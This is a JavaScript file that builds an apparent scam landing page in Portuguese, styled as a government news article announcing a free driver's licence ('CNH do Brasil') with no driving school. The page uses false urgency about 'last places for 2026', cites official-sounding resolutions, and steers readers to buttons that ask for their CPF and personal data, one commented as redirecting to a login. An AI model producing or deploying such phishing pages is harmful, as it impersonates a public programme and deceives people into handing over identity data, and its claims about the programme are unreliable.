import { CONFIG } from './config.js';

// Classe MainContentBuilder - Responsável por construir o conteúdo principal
export class MainContentBuilder {
    constructor(domManager) {
        this.dom = domManager;
    }

    build() {
        const main = this.dom.create('main', 'main-content');
        main.style.cssText = 'max-width: 800px; margin: 0 auto; padding: 24px 16px;';
        
        // Categoria TRÂNSITO
        const categoryDiv = this.dom.create('div', 'article-category');
        categoryDiv.style.cssText = 'margin-bottom: 16px;';
        const category = this.dom.create('span', '', 'TRÂNSITO');
        category.style.cssText = 'font-weight: 700; font-size: 14px; text-transform: uppercase; letter-spacing: 0.05em; color: rgb(85, 85, 85);';
        categoryDiv.appendChild(category);
        main.appendChild(categoryDiv);
        
        // Título
        const title = this.dom.create('h1', 'article-title', 'CNH do Brasil: Governo libera carteira de motorista 100% gratuita e sem necessidade de autoescola');
        title.style.cssText = 'font-size: 24px; line-height: 1.3; font-weight: 700; color: rgb(12, 50, 111); margin-bottom: 16px;';
        if (window.innerWidth >= 768) {
            title.style.fontSize = '30px';
        }
        main.appendChild(title);
        
        // Introdução
        const intro = this.dom.create('p', 'article-intro');
        intro.style.cssText = 'font-size: 16px; line-height: 1.6; color: rgb(85, 85, 85); margin-bottom: 16px;';
        intro.innerHTML = 'Mais de 1 milhão de brasileiros já iniciaram o processo para obter a CNH gratuitamente pelo programa, e <strong style="color: rgb(51, 51, 51);">as vagas para 2026 estão se esgotando.</strong> A Resolução nº 985/2025 do Contran, publicada em 09 de dezembro de 2025, revoluciona o processo de habilitação no país. Agora brasileiros podem tirar a CNH em menos de 20 dias, sem custos com autoescola e com curso teórico totalmente online e gratuito.';
        main.appendChild(intro);
        
        // Ícones sociais
        this.buildSocialShare(main);
        
        // Data de publicação
        const dateDiv = this.dom.create('div', 'article-date');
        dateDiv.style.cssText = 'font-size: 14px; color: rgb(107, 114, 128); margin-bottom: 24px;';
        dateDiv.innerHTML = '<p style="margin: 0;">Publicado em 09/12/2025 20h58</p><p style="margin: 4px 0 0 0;">Atualizado em 10/12/2025 14h42</p>';
        main.appendChild(dateDiv);
        
        // Imagem principal
        const img1Div = this.dom.create('div', 'main-image-container');
        img1Div.style.cssText = 'margin-bottom: 24px;';
        const img1 = this.dom.create('img', 'main-image');
        img1.src = CONFIG.images.mainImage1;
        img1.alt = 'Lançamento do Programa CNH do Brasil';
        img1.style.cssText = 'width: 100%; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);';
        img1Div.appendChild(img1);
        main.appendChild(img1Div);
        
        // Parágrafo com letra capitular
        this.buildDropCapParagraph(main);
        
        // Botão de inscrição 1 (primeiro - rola para o segundo)
        this.buildInscricaoButton(main, false, true);
        
        // Seção 1
        this.buildSection1(main);
        
        // Caixa de destaque
        this.buildHighlightBox(main);
        
        // Imagem 2
        const img2Div = this.dom.create('div', 'main-image-container');
        img2Div.style.cssText = 'margin-bottom: 24px;';
        const img2 = this.dom.create('img', 'main-image');
        img2.src = CONFIG.images.mainImage2;
        img2.alt = 'CNH do Brasil - Como se inscrever';
        img2.style.cssText = 'width: 100%; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);';
        img2Div.appendChild(img2);
        main.appendChild(img2Div);
        
        // Seção 2
        this.buildSection2(main);
        
        // Botão de inscrição 2 (segundo - redireciona para login)
        this.buildInscricaoButton(main, true, false);
        
        // Seção 3
        this.buildSection3(main);
        
        this.dom.append(main);
    }

    buildSocialShare(container) {
        const socialShare = this.dom.create('div', 'social-share');
        socialShare.style.cssText = 'display: flex; align-items: center; gap: 16px; margin-bottom: 16px;';
        
        const shareLabel = this.dom.create('span', 'share-label', 'Compartilhe:');
        shareLabel.style.cssText = 'font-size: 14px; color: rgb(107, 114, 128);';
        socialShare.appendChild(shareLabel);
        
        const iconsContainer = this.dom.create('div', 'social-icons');
        iconsContainer.style.cssText = 'display: flex; gap: 12px;';
        
        // Ícones SVG dos botões sociais
        const socialIcons = [
            { name: 'facebook', path: 'M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z', viewBox: '0 0 320 512' },
            { name: 'twitter', path: 'M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z', viewBox: '0 0 512 512' },
            { name: 'linkedin', path: 'M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z', viewBox: '0 0 448 512' },
            { name: 'whatsapp', path: 'M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z', viewBox: '0 0 448 512' },
            { name: 'link', path: 'M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z', viewBox: '0 0 512 512' }
        ];
        
        socialIcons.forEach(icon => {
            const iconSpan = this.dom.create('span', '');
            iconSpan.style.cssText = 'cursor: pointer; transition: opacity 0.2s; color: rgb(39, 111, 232);';
            iconSpan.onmouseover = () => iconSpan.style.opacity = '0.8';
            iconSpan.onmouseout = () => iconSpan.style.opacity = '1';
            
            const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
            svg.setAttribute('stroke', 'currentColor');
            svg.setAttribute('fill', 'currentColor');
            svg.setAttribute('stroke-width', '0');
            svg.setAttribute('viewBox', icon.viewBox);
            svg.setAttribute('height', '18');
            svg.setAttribute('width', '18');
            svg.setAttribute('xmlns', 'http://www.w3.org/2000/svg');
            
            const path = document.createElementNS('http://www.w3.org/2000/svg', 'path');
            path.setAttribute('d', icon.path);
            svg.appendChild(path);
            iconSpan.appendChild(svg);
            iconsContainer.appendChild(iconSpan);
        });
        
        socialShare.appendChild(iconsContainer);
        container.appendChild(socialShare);
    }

    buildDropCapParagraph(container) {
        const p = this.dom.create('p', 'article-text');
        p.style.cssText = 'font-size: 16px; line-height: 1.6; color: rgb(85, 85, 85); margin-bottom: 16px;';
        p.innerHTML = '<span style="float: left; font-size: 48px; font-weight: 700; color: rgb(19, 81, 180); margin-right: 12px; margin-top: 4px; line-height: 1;">O</span>processo para obter a primeira Carteira Nacional de Habilitação ficou mais simples com o aplicativo CNH do Brasil, plataforma oficial do Ministério dos Transportes. Pelo celular, o cidadão pode abrir o requerimento, acompanhar todas as etapas, realizar o curso teórico gratuito e acessar a versão digital da habilitação. Confira, ponto a ponto, como funciona.';
        container.appendChild(p);
    }

    buildInscricaoButton(container, underline = false, isFirst = false) {
        const containerDiv = this.dom.create('div', 'inscricao-container');
        containerDiv.style.cssText = 'text-align: center; margin: 32px 0;';
        
        const btn = this.dom.create('button', 'btn-inscricao');
        btn.style.cssText = 'background-color: rgb(19, 81, 180); color: white; font-weight: 600; padding: 12px 24px; border-radius: 9999px; font-size: 16px; border: none; cursor: pointer; transition: all 0.2s; box-shadow: 0 4px 6px rgba(0,0,0,0.1);';
        btn.onmouseover = () => btn.style.backgroundColor = 'rgb(13, 60, 140)';
        btn.onmouseout = () => btn.style.backgroundColor = 'rgb(19, 81, 180)';
        
        if (underline) {
            btn.innerHTML = '<span style="text-decoration: underline;">Fazer Minha Inscrição Agora</span>';
        } else {
            btn.textContent = 'Fazer Minha Inscrição Agora';
        }
        
        if (isFirst) {
            btn.classList.add('btn-inscricao-first');
        } else {
            btn.classList.add('btn-inscricao-login');
        }
        
        containerDiv.appendChild(btn);
        
        const subtitle = this.dom.create('p', 'inscricao-subtitle', 'Últimas vagas para 2026');
        subtitle.style.cssText = 'font-size: 16px; color: rgb(85, 85, 85); opacity: 0.6; margin-top: 12px;';
        containerDiv.appendChild(subtitle);
        
        container.appendChild(containerDiv);
    }

    buildHighlightBox(container) {
        const box = this.dom.create('div', 'highlight-box');
        box.style.cssText = 'background-color: rgb(243, 243, 244); border-radius: 6px; padding: 16px; margin-bottom: 24px; max-width: 95%;';
        
        const title = this.dom.create('h4', 'highlight-box-title', 'Últimas Vagas para 2026');
        title.style.cssText = 'font-weight: 600; font-size: 16px; color: rgb(51, 51, 51); margin: 0 0 8px 0;';
        
        const text = this.dom.create('p', 'highlight-box-text');
        text.style.cssText = 'font-size: 16px; line-height: 1.6; color: rgb(85, 85, 85); margin: 0;';
        text.innerHTML = 'Devido à alta demanda, restam poucas vagas para obter a CNH gratuitamente e sem autoescola. Estas são as últimas vagas disponíveis para <strong style="color: rgb(51, 51, 51);">janeiro de 2026</strong>. Caso não realize a inscrição com urgência, a próxima oportunidade será somente entre 2026 e 2027. Quem não se cadastrar arcará com os custos integrais do processo de habilitação.';
        
        box.appendChild(title);
        box.appendChild(text);
        container.appendChild(box);
    }

    buildSection1(container) {
        const section = this.dom.create('section', 'article-section');
        section.style.cssText = 'margin-bottom: 24px;';
        
        const h2 = this.dom.create('h2', 'section-title', '1. O que mudou com a nova resolução?');
        h2.style.cssText = 'font-size: 20px; font-weight: 700; color: rgb(51, 51, 51); margin: 32px 0 16px 0;';
        section.appendChild(h2);
        
        const ul = this.dom.create('ul', 'bullet-list');
        ul.style.cssText = 'list-style: disc; padding-left: 24px; margin-bottom: 16px; color: rgb(85, 85, 85); font-size: 16px; line-height: 1.6;';
        
        const items = [
            '<strong style="color: rgb(51, 51, 51);">Fim da obrigatoriedade de autoescola:</strong> Candidatos não precisam mais frequentar Centros de Formação de Condutores (CFCs)',
            '<strong style="color: rgb(51, 51, 51);">Curso teórico online e gratuito:</strong> Disponível após realizar o cadastro.',
            '<strong style="color: rgb(51, 51, 51);">Carga horária prática reduzida:</strong> De 20 horas obrigatórias para apenas 2 horas mínimas',
            '<strong style="color: rgb(51, 51, 51);">Aulas práticas flexíveis:</strong> Podem ser realizadas com instrutor autônomo credenciado pelo Detran',
            '<strong style="color: rgb(51, 51, 51);">Redução de até 80% nos custos:</strong> Processo que antes custava entre R$ 3.000 e R$ 5.000 agora pode sair praticamente de graça'
        ];
        
        items.forEach(itemText => {
            const li = this.dom.create('li', 'bullet-item');
            li.style.cssText = 'margin-bottom: 12px;';
            li.innerHTML = itemText;
            ul.appendChild(li);
        });
        section.appendChild(ul);
        
        container.appendChild(section);
    }

    buildSection2(container) {
        const section = this.dom.create('section', 'article-section');
        section.style.cssText = 'margin-bottom: 24px;';
        
        const h2 = this.dom.create('h2', 'section-title', '2. Como se inscrever no programa?');
        h2.style.cssText = 'font-size: 20px; font-weight: 700; color: rgb(51, 51, 51); margin: 32px 0 16px 0;';
        section.appendChild(h2);
        
        const p = this.dom.create('p', 'article-text', 'O processo de inscrição é simples e pode ser feito totalmente online:');
        p.style.cssText = 'font-size: 16px; line-height: 1.6; color: rgb(85, 85, 85); margin-bottom: 16px;';
        section.appendChild(p);
        
        const ol = this.dom.create('ol', 'numbered-list');
        ol.style.cssText = 'list-style: decimal; padding-left: 24px; margin-bottom: 16px; color: rgb(85, 85, 85); font-size: 16px; line-height: 1.6;';
        
        const items = [
            'Clique no botão abaixo para iniciar seu cadastro',
            'Informe seu CPF para verificar elegibilidade',
            'Confirme seus dados pessoais',
            'Sua Carteira de Motorista será emitida em até 20 dias'
        ];
        
        items.forEach(item => {
            const li = this.dom.create('li', 'numbered-item');
            li.style.cssText = 'margin-bottom: 12px;';
            li.textContent = item;
            ol.appendChild(li);
        });
        section.appendChild(ol);
        
        container.appendChild(section);
    }

    buildSection3(container) {
        const section = this.dom.create('section', 'article-section');
        section.style.cssText = 'margin-bottom: 24px;';
        
        const h2 = this.dom.create('h2', 'section-title', '3. Base Legal');
        h2.style.cssText = 'font-size: 20px; font-weight: 700; color: rgb(51, 51, 51); margin: 32px 0 16px 0;';
        section.appendChild(h2);
        
        const ul = this.dom.create('ul', 'bullet-list');
        ul.style.cssText = 'list-style: disc; padding-left: 24px; color: rgb(85, 85, 85); font-size: 16px; line-height: 1.6;';
        
        const items = ['Resolução Contran nº 985/2025', 'Lei nº 14.071/2020 (Nova Lei de Trânsito)', 'Decreto nº 11.999/2025 (Programa CNH do Brasil)'];
        items.forEach(item => {
            const li = this.dom.create('li', 'bullet-item');
            li.style.cssText = 'margin-bottom: 8px;';
            li.textContent = item;
            ul.appendChild(li);
        });
        section.appendChild(ul);
        
        container.appendChild(section);
    }
}
